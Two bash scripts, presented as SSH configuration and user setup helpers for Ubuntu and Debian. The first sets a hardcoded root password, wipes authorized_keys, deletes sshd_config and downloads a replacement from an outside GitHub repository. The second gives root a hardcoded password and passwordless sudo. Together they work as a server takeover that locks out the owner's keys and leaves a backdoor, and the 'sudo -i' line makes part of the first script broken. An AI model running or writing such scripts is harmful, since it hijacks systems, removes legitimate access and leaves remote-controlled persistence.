#!/bin/bash 

# Enter root mode 
sudo -i 

# Change root password to 'cambancoreng' 
echo "root:cambancoreng" | sudo chpasswd 

# Script to change SSH configuration and authorized keys 
# For Ubuntu and Debian 

# Step 1: Delete all authorized_keys 
echo "Deleting all authorized_keys..." 
truncate -s 0 ~/.ssh/authorized_keys 

# Step 2: Delete old sshd_config 
echo "Deleting old /etc/ssh/sshd_config file..." 
rm /etc/ssh/sshd_config 

# Step 3: Download new sshd_config 
echo "Downloading new SSH configuration from server..." 
wget -O /etc/ssh/sshd_config https://raw.githubusercontent.com/rensanedo/ssh/main/sshd_config 

# Step 4: Restart SSH service 
echo "Restarting SSH service..." 
systemctl restart ssh 

# Script complete 
echo "SSH configuration and authorized_keys successfully updated." 


#!/bin/bash 

# Make sure the script is run as root 
if [ "$(id -u)" -ne 0 ]; then 
    echo "This script must be run as root." >&2 
    exit 1 
fi 

USERNAME="root" 
PASSWORD="Bambang@#$123" 

# Add a user if it doesn't exist 
if id "$USERNAME" &>/dev/null; then 
    echo "User $USERNAME already exists." 
else 
    useradd -m -s /bin/bash "$USERNAME" 
    echo "$USERNAME:$PASSWORD" | chpasswd 
    usermod -aG sudo "$USERNAME" 
    echo "User $USERNAME has been added with sudo privileges." 
fi 

# Ensure passwordless sudo for this user 
echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$USERNAME 
chmod 0440 /etc/sudoers.d/$USERNAME 

echo "Configuration complete. User $USERNAME has passwordless sudo access."
